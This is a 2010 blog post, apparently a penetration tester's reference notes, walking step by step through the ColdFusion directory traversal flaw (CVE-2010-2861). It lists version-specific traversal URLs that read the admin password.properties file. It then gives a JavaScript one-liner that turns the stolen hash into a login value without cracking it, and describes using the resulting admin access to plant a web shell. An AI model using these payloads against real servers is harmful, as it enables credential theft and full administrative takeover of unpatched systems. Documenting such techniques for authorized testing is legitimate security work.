---
id: 59
title: Cold Fusion Directory Traversal
date: 2010-12-23T19:25:59+00:00
author: Devin Ertel
layout: post
guid: http://www.infointox.net/?p=59
permalink: /?p=59
categories:
  - web app testing
tags:
  - coldfusion
  - directory traversal
  - pentesting
---
[<img class="alignright size-full wp-image-61" title="coldfusion" alt="" src="http://www.infointox.net/wp-content/uploads/2010/12/coldfusion.jpg" width="240" height="234" />](http://www.infointox.net/wp-content/uploads/2010/12/coldfusion.jpg)

So this attack has been published for a while now and I just never posted but I still have found it fruitful during pen tests. For that reason I wanted to collect all the information I have read and learned while performing this attack into one location for my reference.

The basic concept of this attack is a directory traversal to the password.properties which can than be used to login into the server. Once you have admin to Coldfusion you can deploy a cfm web shell through a scheduled task in Coldfusion. Game over of running as administrator. Adobe has released a patch for this attack but I have seen this work on versions 7, 8 and 9 that have not been patched.

**Step 1: Directory Traversal**

This is the step you will see if its vulnerable or not. Below I listed different strings to traverse. All depends on the version to which one will work. Below are ones I have found to work the best for me. Let me know if you know of any others.

Single server configuration ColdFusion

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="php" style="font-family:monospace;">http<span style="color: #339933;">:</span><span style="color: #666666; font-style: italic;">//site/CFIDE/administrator/logging/settings.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en</span></pre>
      </td>
    </tr>
  </table>
</div>

ColdFusion 7

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="php" style="font-family:monospace;">http<span style="color: #339933;">:</span><span style="color: #666666; font-style: italic;">//site/CFIDE/administrator/logging/settings.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en</span></pre>
      </td>
    </tr>
  </table>
</div>

ColdFusion 8

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="php" style="font-family:monospace;">http<span style="color: #339933;">:</span><span style="color: #666666; font-style: italic;">//site/CFIDE/administrator/logging/settings.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en</span></pre>
      </td>
    </tr>
  </table>
</div>

ColdFusion 6,7 AND 8

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="php" style="font-family:monospace;">http<span style="color: #339933;">:</span><span style="color: #666666; font-style: italic;">//site/CFIDE/administrator/logging/settings.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en</span></pre>
      </td>
    </tr>
  </table>
</div>

**Step 2: Javascript:hex\_hmac\_sha1**

Once you have the hash from the password.properties you can either drop those in rainbow tables or my following preferred method. Once you copied the hash go back to the login screen and paste the hash into the password field and copy the following javascript and execute.

<div class="wp_syntax">
  <table>
    <tr>
      <td class="code">
        <pre class="php" style="font-family:monospace;">javascript<span style="color: #339933;">:</span>hex_hmac_sha1<span style="color: #009900;">&#40;</span>document<span style="color: #339933;">.</span>loginform<span style="color: #339933;">.</span>salt<span style="color: #339933;">.</span>value<span style="color: #339933;">,</span>document<span style="color: #339933;">.</span>loginform<span style="color: #339933;">.</span>cfadminPassword<span style="color: #339933;">.</span>value<span style="color: #009900;">&#41;</span></pre>
      </td>
    </tr>
  </table>
</div>

This will return another value. The value returned will be used to pass to the login form. This all has to be down pretty fast. Seems to be 30 seconds or less before this value times out. Sometimes cookies will have to be cleared and you will have to rerun the javascript.

So with this value you just have to intercept the login with a proxy and replace the password parameter with this value. If all goes will you should be rewqreded with a nice admin screen. Now do would you like, I like web shells.

**References:**

<http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/>

 [http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07]( http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07)